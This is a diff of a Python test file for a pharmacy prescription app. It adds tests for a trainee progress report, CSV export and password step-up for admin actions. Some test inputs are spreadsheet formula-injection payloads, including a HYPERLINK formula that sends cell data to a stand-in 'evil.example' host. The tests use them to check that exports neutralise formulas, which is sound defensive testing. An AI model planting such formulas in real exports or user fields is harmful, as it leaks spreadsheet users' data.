@@ -1,12 +1,15 @@
 """Bulk feeding, ZIP import, academy, drugs/doctors, users, settings and audit."""
 
+import csv
 import io
 import json
 import threading
 import zipfile
+from datetime import timedelta
 
 from rushd.context import build_context
-from rushd.models import AuditLog, Doctor, Prescription
+from rushd.db import utcnow
+from rushd.models import AuditLog, Branch, Doctor, Prescription, QuizAttempt, User
 from rushd.training.export import ExportError, decrypt_stream
 
 from .conftest import PASSWORD, make_settings, prescription_image, upload
@@ -126,6 +129,72 @@ def test_academy_round_trip(login, ctx):
     assert trainee.get("/api/academy/me").json()["attempts"] == 1
 
 
+def test_training_manager_progress_report(login, ctx):
+    trainer = login("mona", role="trainer")
+    trainee = login("tamer", role="trainee", full_name='=HYPERLINK("http://evil.example","تامر")')
+    login("hoda", role="trainee")
+    login("ola")  # a pharmacist who never practised
+    easy_uid = upload(trainer, prescription_image(seed=701)).json()["uid"]
+    hard_uid = upload(trainer, prescription_image(seed=702)).json()["uid"]
+    now = utcnow()
+    with ctx.sf() as db:
+        easy = db.query(Prescription).filter_by(uid=easy_uid).one()
+        easy.ai_confidence, easy.acc_drug = 0.95, 1.0
+        hard = db.query(Prescription).filter_by(uid=hard_uid).one()
+        hard.ai_confidence = 0.5
+        ids = {u.username: u.id for u in db.query(User)}
+
+        def attempt(user, rx, percent, days_ago):
+            when = now - timedelta(days=days_ago)
+            db.add(
+                QuizAttempt(
+                    user_id=ids[user],
+                    prescription_id=rx.id,
+                    started_at=when - timedelta(minutes=2),
+                    submitted_at=when,
+                    score=percent / 10,
+                    max_score=10,
+                    details={"percent": percent, "seconds": 120},
+                )
+            )
+
+        for i, percent in enumerate([40, 50, 70, 80]):  # improving over the month
+            attempt("tamer", hard if i % 2 == 0 else easy, percent, days_ago=20 - i)
+        attempt("hoda", easy, 90, days_ago=3)
+        attempt("hoda", hard, 100, days_ago=60)  # outside a 30-day report
+        branch = Branch(name="فرع الدقي")
+        db.add(branch)
+        db.flush()
+        db.get(User, ids["tamer"]).branch_id = branch.id
+        branch_id = branch.id
+        db.commit()
+
+    report = trainer.get("/api/academy/report", params={"days": 30}).json()
+    assert [r["username"] for r in report["rows"]] == ["tamer", "hoda", "ola"]  # weakest first, idle last
+    tamer = report["rows"][0]
+    assert tamer["attempts"] == 4 and tamer["percent"] == 60.0 and tamer["improvement"] == 30.0
+    assert tamer["hard_attempts"] == 2 and tamer["hard_percent"] == 55.0 and tamer["minutes"] == 8
+    assert tamer["branch"] == "فرع الدقي"
+    assert report["rows"][1]["improvement"] is None  # one attempt is too few to call a trend
+    assert report["rows"][2]["attempts"] == 0 and report["rows"][2]["last_activity"] is None
+    assert report["summary"] == {"participants": 2, "inactive": 1, "attempts": 5, "percent": 66.0}
+    yearly = trainer.get("/api/academy/report", params={"days": 365}).json()
+    assert {r["username"]: r["attempts"] for r in yearly["rows"]}["hoda"] == 2
+    one_branch = trainer.get("/api/academy/report", params={"days": 30, "branch_id": branch_id}).json()
+    assert [r["username"] for r in one_branch["rows"]] == ["tamer"] and one_branch["summary"]["percent"] == 60.0
+
+    exported = trainer.get("/api/academy/report.csv", params={"days": 30})
+    assert exported.headers["content-type"].startswith("text/csv") and exported.text.startswith("\ufeff")
+    rows = list(csv.reader(io.StringIO(exported.text.lstrip("\ufeff"))))
+    assert rows[0][0] == "الاسم" and rows[1][1] == "tamer" and rows[1][2] == "متدرب"
+    assert rows[1][0].startswith("'=")  # a name typed as a formula stays text in Excel
+    assert rows[1][5] == "60.0" and rows[1][6] == "30.0"
+    with ctx.sf() as db:
+        assert db.query(AuditLog).filter_by(action="academy_report_exported").count() == 1
+    assert trainee.get("/api/academy/report").status_code == 403
+    assert login("sara").get("/api/academy/report.csv").status_code == 403
+
+
 def test_drug_management_and_suggest(login, ctx):
     trainer = login("mona", role="trainer")
     pharmacist = login("sara")
@@ -145,6 +214,19 @@ def test_drug_management_and_suggest(login, ctx):
     assert "Newdrug" in export.text and export.headers["content-disposition"].startswith("attachment")
 
 
+def test_drug_export_cannot_carry_spreadsheet_formulas(login, ctx):
+    """A pharmacist types a 'drug' that is really an Excel formula; the export must neutralise it."""
+    pharmacist, trainer = login("sara"), login("mona", role="trainer")
+    uid = upload(pharmacist, prescription_image(seed=611)).json()["uid"]
+    evil = '=HYPERLINK("http://evil.example/?"&A2,"Augmentin")'
+    body = {"items": [{"brand": evil}, {"brand": "@SUM(1+1)"}]}
+    assert pharmacist.post(f"/api/prescriptions/{uid}/verify", json=body).status_code == 200
+    rows = list(csv.reader(io.StringIO(trainer.get("/api/drugs/export").text)))
+    brands = [row[0] for row in rows[1:]]
+    assert "'" + evil in brands and "'@SUM(1+1)" in brands
+    assert not any(cell[:1] in ("=", "+", "-", "@", "\t", "\r") for row in rows for cell in row if cell)
+
+
 def test_doctor_merge_keeps_learning(login, ctx):
     trainer = login("mona", role="trainer")
     a = trainer.post("/api/doctors", json={"name": "د. خالد حسن", "specialty": "عظام"}).json()
@@ -156,22 +238,26 @@ def test_doctor_merge_keeps_learning(login, ctx):
         assert db.query(Doctor).count() == 1
 
 
-def test_user_administration(login, app):
+def test_user_administration(login, app, ctx):
     from .conftest import Api
 
     admin = login("boss", role="admin")
-    created = admin.post("/api/users", json={"username": "Nour.Ali", "full_name": "نور", "role": "pharmacist"})
+    new_user = {"username": "Nour.Ali", "full_name": "نور", "role": "pharmacist"}
+    # Account administration needs the password re-entered first, so a hijacked session cannot use it.
+    denied = admin.post("/api/users", json=new_user)
+    assert denied.status_code == 403 and denied.json()["code"] == "step_up_required"
+    assert admin.post("/api/auth/step-up", json={"password": "wrong"}).status_code == 403
+    assert admin.post("/api/users", json=new_user).status_code == 403
+    assert admin.post("/api/auth/step-up", json={"password": PASSWORD}).json()["minutes"] == 10
+
+    created = admin.post("/api/users", json=new_user)
     assert created.status_code == 201
     temp = created.json()["temporary_password"]
     nour = Api(app, "nour.ali", password=temp)
     assert nour.me["flags"]["must_change_password"] is True
     assert admin.post("/api/users", json={"username": "x", "role": "pharmacist"}).status_code == 400
     assert admin.post("/api/users", json={"username": "nour.ali", "role": "pharmacist"}).status_code == 409
-    # Creating another admin requires re-entering the password (step-up).
-    assert admin.post("/api/users", json={"username": "boss2", "role": "admin"}).status_code == 403
-    assert (
-        admin.post("/api/users", json={"username": "boss2", "role": "admin", "password": PASSWORD}).status_code == 201
-    )
+    assert admin.post("/api/users", json={"username": "boss2", "role": "admin"}).status_code == 201
     user_id = created.json()["user"]["id"]
     assert admin.put(f"/api/users/{user_id}", json={"is_active": False}).status_code == 200
     assert nour.get("/api/auth/me").status_code == 401  # disabling revokes sessions
@@ -180,6 +266,28 @@ def test_user_administration(login, app):
     branch = admin.post("/api/branches", json={"name": "فرع المهندسين"})
     assert branch.status_code == 201
     assert admin.post(f"/api/users/{user_id}/reset-password").json()["temporary_password"]
+
+    # The window closes: sensitive changes ask again, harmless edits do not.
+    ctx.step_up.clear(admin.session_id())
+    assert admin.post(f"/api/users/{user_id}/reset-password").status_code == 403
+    assert admin.post(f"/api/users/{user_id}/reset-2fa").status_code == 403
+    assert admin.put(f"/api/users/{user_id}", json={"role": "admin"}).status_code == 403
+    assert admin.put(f"/api/users/{user_id}", json={"full_name": "نور علي", "role": "pharmacist"}).status_code == 200
+
+
+def test_step_up_is_per_session_and_role_checked(login, app, ctx):
+    from .conftest import Api
+
+    admin = login("boss", role="admin")
+    other_tab = Api(app, "boss")  # a second session of the same admin
+    assert admin.post("/api/auth/step-up", json={"password": PASSWORD}).status_code == 200
+    assert other_tab.post("/api/users", json={"username": "x.y", "role": "trainee"}).status_code == 403
+    pharmacist = login("sara")
+    assert pharmacist.post("/api/auth/step-up", json={"password": PASSWORD}).status_code == 200
+    assert pharmacist.post("/api/users", json={"username": "x.z", "role": "admin"}).status_code == 403
+    with ctx.sf() as db:
+        actions = [e.action for e in db.query(AuditLog).filter(AuditLog.action == "step_up")]
+    assert len(actions) == 2
 
 
 def test_settings_validation(login):
